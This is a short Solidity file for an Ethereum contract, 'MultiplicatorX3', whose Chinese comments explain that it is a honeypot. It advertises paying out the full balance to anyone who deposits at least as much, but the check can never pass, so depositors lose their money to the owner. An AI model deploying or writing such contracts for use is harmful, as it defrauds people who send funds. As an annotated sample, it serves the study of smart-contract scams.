pragma solidity ^0.4.18;

contract MultiplicatorX3
{
    address public Owner = msg.sender;

    function() public payable{}

    function withdraw()
    payable
    public
    {
        require(msg.sender == Owner);
        Owner.transfer(address(this).balance);
    }

    //利用邏輯的矛盾使欲攻擊合約者損失貨幣
    //若轉入給合約的錢大於合約現有的餘額，則會轉給合約裡所有的餘額
    //但是在轉入到合約後傳入的錢會馬上加入成合約中的餘額，所以不管如何在執行判斷時都無法大於合約中的餘額
    function multiplicate(address adr)
    public
    payable
    {
        if(msg.value>=address(this).balance)
        {
            adr.transfer(address(this).balance+msg.value);
        }
    }
}
